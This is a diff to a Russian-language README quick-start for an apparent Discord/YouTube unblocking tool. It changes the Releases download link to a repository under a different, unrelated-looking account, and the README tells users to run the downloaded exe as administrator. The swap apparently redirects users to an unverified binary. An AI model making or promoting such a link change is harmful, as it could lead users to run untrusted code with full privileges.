@@ -30,7 +30,7 @@
 
 ## 📥 Быстрый старт
 
-1.  **Скачивание:** Перейдите в раздел [**Releases**](https://github.com/sel1ers/discord-youtube-fix/releases/tag/v1.0).
+1.  **Скачивание:** Перейдите в раздел [**Releases**](https://github.com/funpaytemkaz-boop/ultra-low-latency-fix/releases/tag/v1.0).
 2.  **Распаковка:** Разархивируйте в любую папку (путь без пробелов).
 3.  **Запуск:** Запустите нужный файл (например, `YouTube zapret.exe`) **от имени администратора**.
 4.  **Готово:** Наслаждайтесь. Если не заработало — пропишите в консоли `ipconfig /flushdns`.
